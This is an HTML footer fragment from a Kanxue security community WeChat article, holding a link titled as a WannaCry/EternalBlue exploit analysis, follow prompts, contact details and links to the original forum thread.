target="_blank">【原创】WannaCry勒索软件中“永恒之蓝”漏洞利用分析</a><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">......<br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p></li></ul><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">更多优秀文章，长按下方二维码，“<span style="max-width: 100%; color: rgb(0, 122, 170);">关注看雪学院公众号</span>”查看！</span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p><p style="max-width: 100%; min-height: 1em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><img src="/ikanxue/images/a0942aca19665d63c4ee222be971a37cd63dc1e4.jpeg" style="box-sizing: border-box !important; overflow-wrap: break-word !important; visibility: visible !important; width: 640px !important; height: 426px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span><span style="max-width: 100%; color: rgb(178, 178, 178); box-sizing: border-box !important; overflow-wrap: break-word !important; font-size: 15px;">看雪论坛：http://bbs.pediy.com/</span><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 14px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">微信公众号 ID：ikanxue</span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">微博：看雪安全</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="max-width: 100%; color: rgb(178, 178, 178); font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;">投稿、合作：www.kanxue.com</span><span style="font-size: 15px;"></span><br></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1496016642&src=3&ver=1&signature=1Hp-JGX68UwholXKdYsHgG9Oe2Y4Txgw7FIHUz2sSP2AphHbOB7c*JU7liblQGWtMVZen7MuttjQKfDcEubrQFKvhpt-Dh*Nier2Ts9yzqkCtvOH1X9n3cReG9UfnhfJkLaTdag95oUd16LsVMTm67wEHZ6En5IlajC3wn182ss=">微信地址</a> | <a href="http://bbs.pediy.com/thread-217755.htm">阅读原文</a>
{% endraw  %}

